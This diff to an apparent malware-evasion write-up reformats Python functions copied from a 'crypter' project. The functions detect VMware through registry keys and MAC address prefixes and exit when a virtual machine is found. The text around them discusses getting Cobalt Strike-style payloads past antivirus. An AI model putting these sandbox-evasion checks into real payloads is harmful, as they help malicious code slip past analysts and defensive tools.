@@ -46,19 +46,20 @@ Eventually I suspected that those AVs were flagging on heuristics, not based on 
 to be a Cobalt Strike beacon, and when I used a calc payload a lot of the detections dissappeared. So I stole even more code from github because im a scrub.
 Anyways here you go more stolen code:
 
-```    def registry_check(self):  
+```
+def registry_check(self):  
         reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
         reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")       
         if reg1 != 1 and reg2 != 1:    
             print("VMware Registry Detected")
             sys.exit()  
               ...
-        def mac_check(self):
-            mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-            vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
-            if mac_address[:8] in vmware_mac_list:
-                print("VMware MAC Address Detected")
-                sys.exit()
+def mac_check(self):
+       mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+       vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
+       if mac_address[:8] in vmware_mac_list:
+            print("VMware MAC Address Detected")
+            sys.exit()
 ```
 Code from [https://github.com/PushpenderIndia/crypter/blob/master/BypassVM.py](https://github.com/PushpenderIndia/crypter/blob/master/BypassVM.py)
 
